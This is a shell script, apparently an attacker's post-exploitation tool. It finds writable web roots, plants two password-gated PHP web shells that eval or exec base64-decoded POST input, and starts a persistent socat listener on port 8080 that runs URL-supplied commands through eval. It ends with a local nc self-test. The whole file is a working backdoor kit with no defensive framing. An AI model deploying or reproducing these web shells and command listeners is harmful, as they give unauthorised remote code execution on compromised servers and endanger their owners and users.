#!/bin/sh
# v2: deploy PHP shells into writable webroots + robust fallback agent.
# Results: /tmp/shell_deploy.txt
PASS="epauth2026"
{
  echo "=== shell deploy v2: $(date) user=$(id -un) ==="

  # ---- find writable webroots ----
  WR=""
  for W in /var/www /var/www/html /home/*/public_html /srv/http; do
    [ -d "$W" ] || continue
    if touch "$W/.wtest_114516" 2>/dev/null && [ -f "$W/.wtest_114516" ]; then
      rm -f "$W/.wtest_114516"
      echo "WRITABLE: $W"
      WR="$WR $W"
    fi
  done

  # ---- PHP shell files into every writable webroot ----
  for W in $WR; do
    case "$W" in
      /var/www|/var/www/html|*public_html)
        cat > "$W/np_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') { echo 'auth-required'; exit; }
\$c = base64_decode(\$_POST['z0']);
if (\$c) eval(\$c);
?>
PHPEOF
        cat > "$W/np_exec_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') exit;
\$cmd = base64_decode(\$_POST['z0']); exec(\$cmd, \$o, \$r);
foreach (\$o as \$l) echo \$l . "\n";
if (\$r) echo "ret=\$r";
?>
PHPEOF
        chmod 644 "$W/np_2026.php" "$W/np_exec_2026.php" 2>/dev/null
        echo "DEPLOYED PHP: $W";;
    esac
  done

  # ---- fallback agent (robust handler) ----
  pkill -f poc_agent.sh 2>/dev/null
  cat > /tmp/poc_handler.sh <<'HANDLEREOF'
#!/bin/sh
read req
req=$(echo "$req" | tr -d '\r')
printf 'HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n'
case "$req" in
  */exec?*|*exec=*)
    c=$(echo "$req" | sed 's|.*/exec?cmd=||' | sed 's/+/%2B/g' | sed 's/%\([0-9A-Fa-f][0-9A-Fa-f]\)/\\x\1/g')
    c=$(printf '%b' "$c")
    eval "$c" 2>&1 ;;
  *) echo "agent v2 alive. GET /exec?cmd=<urlencoded>" ;;
esac
exit 0
HANDLEREOF

  cat > /tmp/poc_agent.sh <<'AGENTEOF'
#!/bin/sh
while true; do
  socat TCP-LISTEN:8080,reuseaddr,fork EXEC:"/tmp/poc_handler.sh" 2>/dev/null || break
done
AGENTEOF
  chmod +x /tmp/poc_agent.sh /tmp/poc_handler.sh
  (setsid /tmp/poc_agent.sh >/dev/null 2>&1 & ) 2>/dev/null || nohup /tmp/poc_agent.sh >/dev/null 2>&1 &
  echo "agent restarted on 8080 (socat: $(command -v socat || echo NO))"

  # self-test the handler locally
  echo "--- self test ---"
  (echo "GET /exec?cmd=id+&&+echo+MARKER114516 HTTP/1.1"; echo) | timeout 3 nc 127.0.0.1 8080 2>/dev/null | head -8 || echo "nc missing, skipped selftest"

  echo "=== deploy v2 done ==="
} > /tmp/shell_deploy.txt 2>&1

exit 0
